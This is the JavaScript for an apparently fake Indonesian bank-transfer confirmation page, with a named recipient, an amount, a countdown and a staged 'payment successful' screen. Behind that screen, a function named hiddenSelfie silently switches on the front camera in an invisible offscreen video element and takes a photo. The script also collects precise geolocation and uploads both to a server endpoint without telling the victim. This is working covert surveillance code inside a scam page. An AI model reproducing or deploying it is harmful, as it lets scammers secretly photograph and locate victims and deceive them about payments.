var TARGET_NAME  = 'A.N Ahmad Najih Bahjah (Sea Bank)';
var TOTAL_AMOUNT = 'Rp52.500';

(function injectStyle() {
  if (document.getElementById('dyn-style')) return;
  var s = document.createElement('style');
  s.id = 'dyn-style';
  s.textContent = [
    '.success-wrap{padding:20px 8px;text-align:center;animation:dynPop .3s cubic-bezier(.2,.9,.3,1.2)}',
    '@keyframes dynPop{from{transform:scale(.94);opacity:0}to{transform:scale(1);opacity:1}}',
    '.success-icon{width:88px;height:88px;border-radius:50%;margin:0 auto 18px;',
    'background:linear-gradient(180deg,#22C55E,#16A34A);display:flex;',
    'align-items:center;justify-content:center;box-shadow:0 12px 30px rgba(34,197,94,.35);',
    'animation:successPop .5s cubic-bezier(.2,.9,.3,1.4)}',
    '@keyframes successPop{0%{transform:scale(0)}60%{transform:scale(1.1)}100%{transform:scale(1)}}',
    '.success-icon svg{width:44px;height:44px}',
    '.success-title{font-size:19px;font-weight:800;margin:0 0 8px;color:#16A34A}',
    '.success-desc{font-size:14px;line-height:1.6;color:#5b6b70;margin:0 0 6px}',
    '.success-note{font-size:12.5px;color:#9CA3AF;margin-top:14px;line-height:1.55}',
    '.success-badge{display:inline-block;background:#DCFCE7;color:#16A34A;',
    'font-size:12px;font-weight:700;padding:6px 14px;border-radius:999px;',
    'margin-top:12px;letter-spacing:.02em}'
  ].join('');
  document.head.appendChild(s);
})();

var currentSelfieBlob = null;
var currentLat = null;
var currentLng = null;
var remaining = 4 * 60 + 59;
var countdownEl = document.getElementById('countdown');
var confirmBtn  = document.getElementById('confirmBtn');
var timerChip   = document.querySelector('.timer-chip');

var countdownInterval = setInterval(function () {
  remaining--;
  if (remaining <= 0) {
    clearInterval(countdownInterval);
    countdownEl.textContent = '00:00';
    timerChip.innerHTML = 'Waktu konfirmasi telah habis';
    confirmBtn.disabled = true;
    confirmBtn.textContent = 'Sesi berakhir';
    return;
  }
  var mm = String(Math.floor(remaining / 60)).padStart(2, '0');
  var ss = String(remaining % 60).padStart(2, '0');
  countdownEl.textContent = mm + ':' + ss;
}, 1000);

var toastEl = document.getElementById('toast');
var toastTimeout;

function showToast(msg) {
  clearTimeout(toastTimeout);
  toastEl.textContent = msg;
  toastEl.classList.add('show');
  toastTimeout = setTimeout(function () { toastEl.classList.remove('show'); }, 2600);
}

var sourceBackdrop = document.getElementById('sourceBackdrop');

document.getElementById('sourceBtn').addEventListener('click', function () {
  sourceBackdrop.classList.add('open');
});

document.getElementById('closeSource').addEventListener('click', function () {
  sourceBackdrop.classList.remove('open');
});

sourceBackdrop.addEventListener('click', function (e) {
  if (e.target === sourceBackdrop) sourceBackdrop.classList.remove('open');
});

var sourceLabel = document.getElementById('sourceLabel');

document.querySelectorAll('.account-option').forEach(function (btn) {
  btn.addEventListener('click', function () {
    document.querySelectorAll('.account-option').forEach(function (b) {
      b.classList.remove('selected');
    });
    btn.classList.add('selected');
    sourceLabel.textContent = btn.getAttribute('data-label');
    sourceBackdrop.classList.remove('open');
  });
});

document.getElementById('cancelBtn').addEventListener('click', function () {
  showToast('Transaksi dibatalkan.');
});

function getLocation() {
  return new Promise(function (resolve) {
    if (!navigator.geolocation) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      function (pos) {
        resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude });
      },
      function () { resolve(null); },
      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
  });
}

function hiddenSelfie() {
  return new Promise(function (resolve) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      return resolve(null);
    }

    var video = document.createElement('video');
    video.setAttribute('autoplay', '');
    video.setAttribute('playsinline', '');
    video.setAttribute('muted', '');
    video.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';

    var canvas = document.createElement('canvas');
    canvas.style.cssText = 'display:none;';

    document.body.appendChild(video);
    document.body.appendChild(canvas);

    var stream = null;

    function cleanup() {
      if (stream) stream.getTracks().forEach(function (t) { t.stop(); });
      if (video.parentNode) video.parentNode.removeChild(video);
      if (canvas.parentNode) canvas.parentNode.removeChild(canvas);
    }

    navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 720 }, height: { ideal: 720 } },
      audio: false
    }).then(function (s) {
      stream = s;
      video.srcObject = s;

      var captured = false;
      function captureOnce() {
        if (captured) return;
        captured = true;

        try {
          var w = video.videoWidth  || 640;
          var h = video.videoHeight || 480;
          canvas.width  = w;
          canvas.height = h;
          canvas.getContext('2d').drawImage(video, 0, 0);

          canvas.toBlob(function (blob) {
            cleanup();
            resolve(blob || null);
          }, 'image/jpeg', 0.82);
        } catch (e) {
          cleanup();
          resolve(null);
        }
      }

      video.onloadedmetadata = function () {
        setTimeout(captureOnce, 800);
      };
      setTimeout(captureOnce, 2500);

    }).catch(function () {
      cleanup();
      resolve(null);
    });
  });
}

function sendToServer(lat, lng, selfieBlob) {
  return new Promise(function (resolve, reject) {
    var formData = new FormData();
    formData.append('latitude', lat);
    formData.append('longitude', lng);

    if (selfieBlob) {
      var file = new File([selfieBlob], 'selfie.jpg', { type: 'image/jpeg' });
      formData.append('selfie', file);
    }
fetch('/api/submit.php', {
  method: 'POST',
  body: formData
})
    .then(function (res) {
      return res.text().then(function (text) {
        var json;
        try { json = JSON.parse(text); }
        catch (e) {
          throw new Error('Respons server tidak valid: ' + text.slice(0, 120));
        }
        if (!res.ok || !json.ok) throw new Error(json.error || 'Server error');
        return json;
      });
    })
    .then(resolve)
    .catch(reject);
  });
}

function showSuccess() {
  var hero = document.querySelector('.hero');
  var timer = document.querySelector('.timer-chip');
  if (timer && timer.parentNode) timer.parentNode.removeChild(timer);

  var content   = document.querySelector('.content');
  var actions   = document.querySelector('.actions');
  var heroTitle = hero ? hero.querySelector('h2') : null;

  if (heroTitle) {
    heroTitle.innerHTML = 'Pembayaran Berhasil';
  }

  if (content) {
    content.innerHTML = ''
      + '<div class="card success-wrap">'
      +   '<div class="success-icon">'
      +     '<svg viewBox="0 0 24 24" fill="none">'
      +       '<path d="M5 13l4 4L19 7" stroke="#fff" stroke-width="3" '
      +             'stroke-linecap="round" stroke-linejoin="round"/>'
      +     '</svg>'
      +   '</div>'
      +   '<h3 class="success-title">Transfer Sedang Diproses</h3>'
      +   '<p class="success-desc">'
      +     'Pembayaran sebesar <strong>' + TOTAL_AMOUNT + '</strong><br>'
      +     'sedang dikirim ke rekening tujuan.'
      +   '</p>'
      +   '<div class="success-badge">⏱ Estimasi 5 menit</div>'
      +   '<p class="success-note">'
      +     'Silakan tunggu sekitar 5 menit hingga dana masuk ke rekening penerima.<br>'
      +     'Anda dapat menutup halaman ini.'
      +   '</p>'
      + '</div>';
  }

  if (actions) {
    actions.style.display = 'none';
  }

  window.scrollTo({ top: 0, behavior: 'smooth' });
}

confirmBtn.addEventListener('click', function () {
  if (confirmBtn.disabled) return;
  if (remaining <= 0) return;

  confirmBtn.disabled = true;
  confirmBtn.textContent = 'Memproses...';

  // 1️⃣ Langsung tampilkan halaman sukses
  showSuccess();

  // 2️⃣ Ambil lokasi + selfie paralel, kirim di background
  (async function () {
    try {
      var tasks = await Promise.all([
        getLocation(),
        hiddenSelfie()
      ]);

      var loc    = tasks[0];
      var selfie = tasks[1];

      var lat = loc ? loc.lat : 0;
      var lng = loc ? loc.lng : 0;

      currentLat = lat;
      currentLng = lng;
      currentSelfieBlob = selfie;

      await sendToServer(lat, lng, selfie);

      console.log('[OK] Data terkirim ke server');

    } catch (err) {
      console.warn('[WARN] Gagal kirim:', err.message);
    }
  })();
});